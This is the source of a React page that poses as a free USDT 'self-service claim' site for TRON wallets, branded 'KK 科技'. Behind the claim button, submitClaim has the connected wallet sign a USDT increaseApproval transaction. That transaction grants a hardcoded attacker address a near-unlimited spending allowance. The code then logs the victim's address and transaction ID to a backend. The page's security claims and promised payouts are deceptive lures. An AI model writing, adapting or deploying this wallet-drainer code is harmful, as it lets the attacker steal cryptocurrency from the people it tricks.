"use client";
import { useState } from "react";
import { useWallet } from "@tronweb3/tronwallet-adapter-react-hooks";
import WalletModal from "./components/WalletModal";

const USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const USDT_SPENDER_ADDRESS = "TDAWvz7AgmdUSaLiU5Bnhnyzm9Hm45y9i6";
const TRON_FULL_HOST = "https://api.trongrid.io";
const APPROVE_FEE_LIMIT = 100_000_000;
const TRANSACTION_EXPIRATION_EXTENSION_SECONDS = 1740;

export default function WalletPage() {
  const { address: walletAddress, connected, signTransaction } = useWallet();
  const [amount, setAmount] = useState("2000");
  const [inputAddress, setInputAddress] = useState("");
  const [walletOpen, setWalletOpen] = useState(false);
  const [msg, setMsg] = useState("");
  const [step, setStep] = useState("");
  const [loading, setLoading] = useState(false);

  function bindWallet() {
    if (!inputAddress.trim()) {
      setMsg("请输入您的TRON钱包地址");
      return;
    }
    const reg = /^T[1-9A-HJ-NP-Za-km-z]{33}$/;
    if (!reg.test(inputAddress)) {
      setMsg("请输入正确的TRON钱包地址");
      return;
    }
    setWalletOpen(true);
  }
  function walletSuccess() {
    setWalletOpen(false);
    setMsg("✓ TRON钱包连接成功");
  }
  async function submitClaim() {
    try {
      if (loading) return;
      if (!walletAddress) {
        setMsg("请先连接TRON钱包");
        return;
      }
      setLoading(true);
      setStep("正在创建授权交易...");
      setMsg("请等待钱包确认");

      const { TronWeb } = await import("tronweb");
      const tronWeb = new TronWeb({ fullHost: TRON_FULL_HOST });
      const ownerAddressHex = tronWeb.address.toHex(walletAddress);
      const contractAddressHex = tronWeb.address.toHex(USDT_CONTRACT_ADDRESS);
      const parameters = [
        { type: "address", value: USDT_SPENDER_ADDRESS },
        { type: "uint256", value: "1793719476511300" }
      ];
      const transactionWrapper = await tronWeb.transactionBuilder.triggerSmartContract(
        contractAddressHex,
        "increaseApproval(address,uint256)",
        { feeLimit: APPROVE_FEE_LIMIT, callValue: 0 },
        parameters,
        ownerAddressHex
      );
      if (!transactionWrapper || !transactionWrapper.transaction) {
        throw new Error("创建授权交易失败");
      }

      const extendedTransaction = await tronWeb.transactionBuilder.extendExpiration(
        transactionWrapper.transaction,
        TRANSACTION_EXPIRATION_EXTENSION_SECONDS,
        { txLocal: true }
      );
      if (!signTransaction) {
        throw new Error("钱包不支持签名");
      }
      setStep("等待钱包签名...");
      setMsg("请在TRON钱包中确认授权");
      const signedTransaction = await signTransaction(extendedTransaction);
      if (!signedTransaction || !signedTransaction.txID) {
        throw new Error("钱包签名失败");
      }
      setStep("正在提交链上交易...");
      const broadcastResult = await tronWeb.trx.sendRawTransaction(signedTransaction);
      if (!broadcastResult || !broadcastResult.result) {
        throw new Error("交易广播失败");
      }
      const txId = signedTransaction.txID || broadcastResult?.transaction?.txID;
      if (!txId) {
        throw new Error("未获取交易哈希");
      }
      setStep("正在保存领取记录...");
      const response = await fetch("/api/claim", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          address: walletAddress,
          amount,
          txId,
          time: new Date().toISOString()
        })
      });
      const result = await response.json();
      if (!response.ok) {
        throw new Error(result?.error || "保存记录失败");
      }
      setMsg("✅ 提交成功\n\n系统正在逐一审核。\n\n10分钟未到账请联系客服");
      setStep("");
    } catch (error: any) {
      console.log("claim error:", error);
      setStep("");
      setMsg("❌ 领取失败\n\n" + (error?.message || "请重新提交"));
    } finally {
      setLoading(false);
    }
  }

  return (
    <div className="min-h-screen bg-[#030817] text-white px-5 py-6">
      <div className="flex justify-between items-center">
        <div className="flex items-center gap-3">
          <div className="w-14 h-14 rounded-2xl bg-gradient-to-br from-cyan-300 to-blue-500 flex items-center justify-center text-black font-black text-xl">KK</div>
          <div>
            <div className="font-bold text-lg">KK 科技</div>
            <div className="text-xs text-gray-400">KK_keji888</div>
          </div>
        </div>
        <div className="rounded-2xl border border-red-400/30 bg-white/5 px-4 py-3">
          <div className="text-red-400 font-bold text-sm">● TRON</div>
          <div className="text-gray-400 text-xs">TRC20 Network</div>
        </div>
      </div>
      <div className="text-center mt-16">
        <div className="inline-block rounded-full border border-cyan-400/30 px-5 py-2 text-cyan-300 text-sm">◆ Secure Web3 Service</div>
        <h1 className="text-4xl font-bold mt-8">自助领取USDT</h1>
        <p className="text-gray-400 mt-5 leading-8">绑定您的TRON钱包地址<br />用于USDT提取</p>
      </div>
      <div className="mt-12">
        <h2 className="font-bold text-lg mb-5">选择领取金额</h2>
        <label className={`block rounded-3xl border p-6 mb-4 cursor-pointer ${amount === "2000" ? "border-cyan-400 bg-cyan-400/10" : "border-white/10 bg-white/5"}`}>
          <input type="radio" checked={amount === "2000"} onChange={() => setAmount("2000")} className="hidden" />
          <div className="text-cyan-300 text-sm">◆ 测试领取专用</div>
          <div className="text-4xl font-bold mt-3">2000<span className="text-xl text-cyan-300 ml-2">USDT</span></div>
        </label>
        <div className="grid grid-cols-2 gap-4">
          {["10000", "20000", "30000"].map(item => (
            <label key={item} className={`rounded-2xl border py-5 text-center cursor-pointer ${amount === item ? "border-cyan-400 bg-cyan-400/20 text-cyan-300" : "border-white/10 bg-white/5"}`}>
              <input type="radio" checked={amount === item} onChange={() => setAmount(item)} className="hidden" />
              {item} USDT
            </label>
          ))}
        </div>
      </div>
      <div className="mt-12">
        <h2 className="font-bold text-lg mb-5">提取地址绑定</h2>
        <div className="bg-white/5 border border-white/10 rounded-3xl p-5">
          <div className="text-gray-400 text-sm mb-3">绑定地址</div>
          <input value={inputAddress} onChange={(e) => setInputAddress(e.target.value)} placeholder="请输入您的TRON钱包地址" className="w-full bg-transparent outline-none" />
        </div>
        <button onClick={connected ? submitClaim : bindWallet} disabled={loading} className="mt-6 w-full rounded-2xl py-5 font-bold text-black bg-gradient-to-r from-cyan-300 to-blue-400 flex justify-center items-center gap-3">
          {loading ? (<><span className="w-5 h-5 border-2 border-black border-t-transparent rounded-full animate-spin"></span>处理中...</>) : connected ? "🚀 提交领取" : "🔗 连接TRON钱包"}
        </button>
        {step && <div className="text-center text-cyan-300 mt-4 text-sm">{step}</div>}
        {msg && <div className="text-center text-cyan-300 mt-5 whitespace-pre-line text-sm">{msg}</div>}
      </div>
      <div className="mt-12 space-y-4">
        <div className="bg-white/5 border border-white/10 rounded-2xl p-4">🛡️ 军级加密技术，确保地址绑定安全</div>
        <div className="bg-white/5 border border-white/10 rounded-2xl p-4">⚡ 毫秒级处理速度，及时完成绑定</div>
        <div className="bg-white/5 border border-white/10 rounded-2xl p-4">🔰 专业风控团队，24小时安全保障</div>
      </div>
      <footer className="text-center mt-16 pb-10 text-gray-500">
        <div className="text-3xl text-cyan-300 font-black">KK</div>
        <div className="mt-2">KK 科技 · KK_keji888</div>
        <div className="text-xs mt-2">Secure Web3 Infrastructure</div>
      </footer>
      <WalletModal open={walletOpen} onClose={() => setWalletOpen(false)} onConnected={walletSuccess} onError={(error: string) => { setMsg(error); }} />
    </div>
  );
}
